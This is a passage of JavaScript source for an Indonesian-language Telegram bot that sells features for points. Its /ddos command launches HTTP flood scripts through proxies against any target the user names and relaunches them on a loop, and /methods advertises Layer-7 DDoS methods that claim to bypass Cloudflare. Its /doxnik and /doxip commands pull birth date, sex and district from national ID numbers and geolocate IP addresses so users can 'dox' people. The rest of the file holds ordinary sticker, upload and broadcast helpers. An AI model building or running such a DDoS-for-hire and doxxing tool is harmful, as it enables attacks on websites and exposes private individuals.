  if (!fs.existsSync(metodePath)) return bot.sendMessage(chatId, `❌ *Metode ${methods} tidak dikenali.*`, { parse_mode: "Markdown" });

  const proxyPath = path.join(__dirname, "proxy.txt");
  if (!fs.existsSync(proxyPath)) {
    return bot.sendMessage(chatId, `❌ File proxy.txt tidak ditemukan. Proses dibatalkan.`, { parse_mode: "Markdown" });
  }

  const cmd = `node ${metodePath} ${target} ${duration} 100 100 proxy.txt`;
  exec(cmd);

  const ownerMsg = `🔔 *Penggunaan /ddos*\n👤 ${penggunaName} (id: ${userId})\n🎯 ${target}\n⏱️ ${duration}s\n⚙️ ${methods}`;
  await bot.sendMessage(OWNER_ID, ownerMsg, { parse_mode: "Markdown" });

  if (methods.toLowerCase() === "flood") {
    if (persistentChecks.has(target)) return;
    const info = { active: true, attempts: 0 };
    persistentChecks.set(target, info);

    (async () => {
      while (info.active) {
        info.attempts++;
        const iterCmd = `node ${metodePath} ${target} ${duration} 100 100 proxy.txt`;
        exec(iterCmd);
        console.log("Serangan selesai, serangan dilakukan kembali");
        await sleep(20 * 60 * 1000);
      }
      persistentChecks.delete(target);
    })();
  }
});

bot.onText(/^\/listddos$/, async (msg) => {
  const chatId = msg.chat.id;
  if (persistentChecks.size === 0) {
    return bot.sendMessage(chatId, "📭 Tidak ada target aktif saat ini.");
  }

  let teks = "📋 *Daftar Target Aktif:*\n\n";
  let i = 1;
  for (const [target, info] of persistentChecks.entries()) {
    teks += `${i++}. ${target} (Percobaan ke-${info.attempts})\n`;
  }

  await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
});

bot.onText(/^\/stopddos\s+(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1].trim();

  if (!persistentChecks.has(target)) {
    return bot.sendMessage(chatId, `❌ Target *${target}* tidak ditemukan atau sudah dihentikan.`, { parse_mode: "Markdown" });
  }

  const info = persistentChecks.get(target);
  info.active = false;
  persistentChecks.delete(target);

  await bot.sendMessage(chatId, `🛑 Pengecekan untuk *${target}* telah dihentikan.`, { parse_mode: "Markdown" });
});
bot.onText(/^\/doxnik(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const nikInput = match[1];
  const biaya = 5;

  if (!nikInput) {
    return bot.sendMessage(
      chatId,
      `📋 <b>Contoh Penggunaan:</b>\n<code>/doxnik 16070xxxxxxxxxxxx</code>\n\n💡 Pastikan kamu sudah mendapatkan NIK target terlebih dahulu.`,
      { parse_mode: "HTML" }
    );
  }

  try {
    const nik = nikParser(nikInput);
    if (typeof nik.isValid === "function" && !nik.isValid()) {
      return bot.sendMessage(chatId, "❌ NIK tidak valid.");
    }

    if (!consumePoint(userId, biaya)) {
      return bot.sendMessage(chatId, `❌ Poin kamu tidak cukup. Diperlukan ${biaya} poin untuk menggunakan fitur ini.`);
    }

    const provinsi = nik.province();
    const kabupaten = nik.kabupatenKota();
    const kecamatan = nik.kecamatan();
    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(
      `${kecamatan}, ${kabupaten}, ${provinsi}`
    )}`;

    const hasil = `
<code>🪪 HASIL PARSING NIK</code>
━━━━━━━━━━━━━━━━━━
<b>✅ NIK Valid:</b> ${typeof nik.isValid === "function" ? nik.isValid() : "N/A"}
<b>📍 Provinsi ID:</b> ${typeof nik.provinceId === "function" ? nik.provinceId() : "N/A"}
<b>🏙️ Nama Provinsi:</b> ${provinsi || "N/A"}
<b>🏢 Kabupaten ID:</b> ${typeof nik.kabupatenKotaId === "function" ? nik.kabupatenKotaId() : "N/A"}
<b>🏘️ Nama Kabupaten:</b> ${kabupaten || "N/A"}
<b>🗺️ Kecamatan ID:</b> ${typeof nik.kecamatanId === "function" ? nik.kecamatanId() : "N/A"}
<b>🏠 Nama Kecamatan:</b> ${kecamatan || "N/A"}
<b>📫 Kode Pos:</b> ${typeof nik.kodepos === "function" ? nik.kodepos() : "N/A"}
<b>🚻 Jenis Kelamin:</b> ${typeof nik.kelamin === "function" ? nik.kelamin() : "N/A"}
<b>🎂 Tanggal Lahir:</b> ${typeof nik.lahir === "function" ? nik.lahir() : "N/A"}
<b>🧩 Uniqcode:</b> ${typeof nik.uniqcode === "function" ? nik.uniqcode() : "N/A"}
━━━━━━━━━━━━━━━━━━
📍 <a href="${mapsUrl}">Lihat Lokasi di Google Maps</a>
`.trim();

    await bot.sendMessage(chatId, hasil, {
      parse_mode: "HTML",
      disable_web_page_preview: false,
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses NIK. Poin tidak dikurangi.");
  }
});

// === DOX IP ===
bot.onText(/^\/doxip\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const ip = match[1].trim();
  const biaya = 4;

  try {
    const res = await fetch(`https://ipwho.is/${ip}`).then((r) => r.json()).catch(e => { throw e; });

    if (!res || !res.success) {
      console.error("ipwho.is response:", res);
      return bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP ${ip}.`);
    }

    if (!consumePoint(userId, biaya)) {
      return bot.sendMessage(chatId, `❌ Poin kamu tidak cukup. Diperlukan ${biaya} poin untuk menggunakan fitur ini.`);
    }

    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${res.latitude},${res.longitude}`;

    const info = `
<code>🌍 IP INFORMATION</code>
━━━━━━━━━━━━━━━━━━
<b>IP:</b> ${res.ip || "N/A"}
<b>Type:</b> ${res.type || "N/A"}
<b>Country:</b> ${res.country || "N/A"}
<b>Region:</b> ${res.region || "N/A"}
<b>City:</b> ${res.city || "N/A"}
<b>Latitude:</b> ${res.latitude}
<b>Longitude:</b> ${res.longitude}
<b>ISP:</b> ${res.connection?.isp || "N/A"}
<b>Org:</b> ${res.connection?.org || "N/A"}
<b>Domain:</b> ${res.connection?.domain || "N/A"}
<b>Timezone:</b> ${res.timezone?.id || "N/A"}
<b>Local Time:</b> ${res.timezone?.current_time || "N/A"}
<b>Flag:</b> ${res.flag?.emoji || "N/A"}
━━━━━━━━━━━━━━━━━━
📍 <a href="${mapsUrl}">Lihat di Google Maps</a>
`.trim();

    try {
      if (res.latitude && res.longitude) {
        await bot.sendLocation(chatId, res.latitude, res.longitude);
      }
    } catch (locErr) {
      console.error("Failed to send location:", locErr);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP ${ip}. Poin tidak dikurangi.`);
  }
});

// === Bantuan jika tanpa argumen (/doxip saja) ===
bot.onText(/^\/doxip$/i, async (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, "📌 <b>Example:</b> <code>/doxip 112.90.150.204</code>", {
    parse_mode: "HTML",
  });
});
bot.onText(/^\/bedrocarct(?:@[\w_]+)?/, async (msg) => {
  const senderId = msg.from.id;

  // Validasi OWNER_ID
  if (!OWNER_ID) {
    return bot.sendMessage(senderId, "⚠️ OWNER_ID belum diset di file config.js!");
  }

  // Konversi semua jadi string untuk memastikan cocok
  const isOwner = Array.isArray(OWNER_ID)
    ? OWNER_ID.map(id => String(id)).includes(String(senderId))
    : String(senderId) === String(OWNER_ID);

  // Jika bukan owner
  if (!isOwner) {
    return bot.sendMessage(senderId, "❌ Hanya OWNER yang dapat menggunakan perintah ini.");
  }

  const reply = msg.reply_to_message;
  if (!reply) {
    return bot.sendMessage(senderId, "🔁 Balas pesan teks, foto, video, atau dokumen yang ingin dikirim, lalu gunakan /bc");
  }

  const users = Object.keys(loadJSON(POINTS_FILE));
  if (users.length === 0)
    return bot.sendMessage(senderId, "⚠️ Tidak ada user yang terdaftar di database.");

  const statusMsg = await bot.sendMessage(senderId, `📢 Mulai broadcast ke *${users.length}* user...`, { parse_mode: 'Markdown' });

  let sentCount = 0;
  let failedCount = 0;
  let idx = 0;

  for (const userId of users) {
    idx++;
    try {
      if (reply.text) {
        await bot.sendMessage(userId, reply.text, { parse_mode: "Markdown" });
      } else if (reply.photo) {
        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const caption = reply.caption || '';
        await bot.sendPhoto(userId, fileId, { caption, parse_mode: "Markdown" });
      } else if (reply.document) {
        await bot.sendDocument(userId, reply.document.file_id, { caption: reply.caption || '' });
      } else if (reply.video) {
        await bot.sendVideo(userId, reply.video.file_id, { caption: reply.caption || '' });
      } else {
        const fallback = reply.caption || '📢 Broadcast (tipe pesan ini tidak sepenuhnya didukung).';
        await bot.sendMessage(userId, fallback);
      }
      sentCount++;
    } catch {
      failedCount++;
    }

    // Update progress tiap 20 user atau di akhir
    if (idx % 20 === 0 || idx === users.length) {
      try {
        await bot.editMessageText(
          `📢 Mengirim broadcast: ${idx}/${users.length}\n✅ Terkirim: ${sentCount}\n⚠️ Gagal: ${failedCount}`,
          {
            chat_id: statusMsg.chat.id,
            message_id: statusMsg.message_id,
            parse_mode: 'Markdown'
          }
        );
      } catch {}
    }

    // jeda 0.5 detik agar aman dari rate-limit
    await new Promise(res => setTimeout(res, 500));
  }

  await bot.sendMessage(senderId, `✅ Broadcast selesai!\n\n📬 Terkirim: ${sentCount}\n⚠️ Gagal: ${failedCount}`);
});
bot.onText(/^\/methods(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;

  const plain = `
👾 Daftar Metode Layer 7:

- flood — HTTP(s) Flood DoS
- h2-flood — HTTP(s) h2-Flood DoS
- tls — TLS 1.3 / HTTPS-based methods
- strike — Best DDoS methods
- kill — Bypass CF / DDoS bypass methods
- raw — Huge RPS (raw HTTP request flex)
- bypass — High-power bypass methods
- thunder — Massive-power methods
- storm — The raining request (persistent HTTP flood)
- rape — Bypass protection
- destroy — Kill that socket
`.trim();

  const html = asHtmlBlockFromPlain(plain);

  // Kirim sebagai HTML. disable_web_page_preview untuk mencegah preview jika ada URL.
  bot.sendMessage(chatId, html, { parse_mode: "HTML", disable_web_page_preview: true });
});
// /iqc command
bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh penggunaan:\n`/iqc Woik| 00:55 | 55 | INDOSAT`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(p => p.trim());
  const text = parts[0];
  const time = parts[1] || "12:12";
  const battery = parts[2] || "17";
  const carrier = parts[3] || "INDOSAT OREDOO";

  const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    await bot.sendPhoto(chatId, buffer, {
      caption: `🪄 *iPhone Quoted Generator ?*
      
💬 \`${text}\`
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌈ DEVELϴPER ⌋", url: "https://t.me/WAN_HOST" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});

// /brat command
bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId,
      "❌ Format salah.\n\nContoh penggunaan:\n`/brat Hello World`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const text = argsRaw.trim();
    if (!text) {
      return bot.sendMessage(chatId, '❌ Teks tidak boleh kosong!', { parse_mode: "Markdown" });
    }

    const delay = 500; // delay default
    const isAnimated = false; // default animasi GIF

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });

    const buffer = Buffer.from(response.data);

    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, '❌ Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});
const saveDir = path.join(__dirname, "downloads");
if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir);

// === FUNGSI UPLOAD KE CATBOX ===
async function uploadToCatbox(filePath) {
  const form = new FormData();
  form.append("reqtype", "fileupload");
  form.append("fileToUpload", fs.createReadStream(filePath));

  const res = await axios({
    method: "post",
    url: "https://catbox.moe/user/api.php",
    data: form,
    headers: form.getHeaders(),
    timeout: 60000,
  });

  if (typeof res.data === "string" && res.data.startsWith("http")) {
    return res.data.trim();
  }
  throw new Error("Catbox gagal upload");
}

// === COMMAND /tourl ===
bot.onText(/\/tourl/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || (!reply.photo && !reply.video))
    return bot.sendMessage(chatId, "❌ Balas foto atau video dengan /tourl");

  const fileId = reply.photo
    ? reply.photo[reply.photo.length - 1].file_id
    : reply.video.file_id;
  const fileType = reply.photo ? ".jpg" : ".mp4";

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TELEGRAM_TOKEN}/${file.file_path}`;
    const fileName = `file_${Date.now()}${fileType}`;
    const savePath = path.join(saveDir, fileName);

    // === DOWNLOAD FILE DARI TELEGRAM ===
    await new Promise((resolve, reject) => {
      const stream = fs.createWriteStream(savePath);
      https
        .get(fileUrl, (res) => {
          if (res.statusCode !== 200)
            return reject(new Error("Gagal download file"));
          res.pipe(stream);
          stream.on("finish", () => stream.close(resolve));
        })
        .on("error", reject);
    });

    // === UPLOAD KE CATBOX ===
    bot.sendMessage(chatId, "⏳ Sedang mengupload ke Catbox, mohon tunggu...");
    const url = await uploadToCatbox(savePath);

    // === KIRIM HASILNYA ===
    bot.sendMessage(
      chatId,
      `✅ Berhasil upload ke Catbox\n🔗 URL: ${url}\n📁 Disimpan di: ${savePath}`
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Gagal mengambil atau upload file.");
  }
});
